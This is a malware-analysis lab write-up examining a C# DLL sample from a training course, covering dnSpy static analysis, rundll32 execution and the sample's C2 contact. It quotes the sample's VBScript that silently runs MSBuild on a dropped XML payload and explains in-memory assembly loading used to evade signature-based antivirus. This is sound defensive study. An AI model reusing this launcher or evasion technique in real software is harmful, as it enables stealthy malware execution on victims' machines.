# Intro
C# is very easy to reverse engineering this because are compiled in **Common Intermediate Language (CIL)** similar to assembly and load in the `.exe` or `.dll` file. When the code will be executed enter in the game the **Common Language Runtime (CLR)** manage the CIL code and convert it in machine language.

# Reverse Engineering 

Malware Sample: **PMAT-labs/labs/3-4.StaySharp-CSharpMalware/Malware.cryptlib64.dll.malz/Malware.cryptlib64.dll.malz.7z**

## Static Analysis
The real name of our DLL is `EmbedDLL`. Open the DLL in a Dnspy and we ca see the Main function is empty.
![[Pasted image 20250201221510.png]]

In the `embed` method we have a base64 string crypted with AES algorithm.
We have 
![[Pasted image 20250201221823.png]]

So we have a base64 string crypted and after execution the contente will be saved in `C:\Users\Public\embed.xml`, and the second base64 are not crypted so this is the source code of that
```VB
Set oShell = CreateObject ("Wscript.Shell") 
Dim strArgs
strArgs = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Users\Public\embed.xml"
oShell.Run strArgs, 0, false
```

So this vb script build using MSBuild the previously xml.


## Dynamic Analysis

We can launch a DLL with `rundll32.exe <DLLname>`. By default this execute the `main` function but as notice previously we don't have anything in the main function we need to execute the `embed` function.

```bash
rundll32.exe .\Malware.cryptlib64.dll, embed
```

The xml file 
![[Pasted image 20250201225751.png]]
![[Pasted image 20250201225807.png]]

Now we can examinate the content of xml file.
![[Pasted image 20250201230430.png]]

- `System.Reflection.Assembly.Load(oms.ToArray())`: This load an .NET Assembly  in memory without write on disk.
- `.EntryPoint.Invoke(0, new object[] { new string[]{ } })`: This invoke the `main` function in the assembly loaded.

This is useful to bypass AV signed based.

I have tied to execute the vbs file and i notice the malware contact the following domain:

`srv.masterchiefsgruntemporium.local`
![[Pasted image 20250201231708.png]]

And execute a GET request of the following URI
`http://srv.masterchiefsgruntemporium.local/en-us/docs.html`

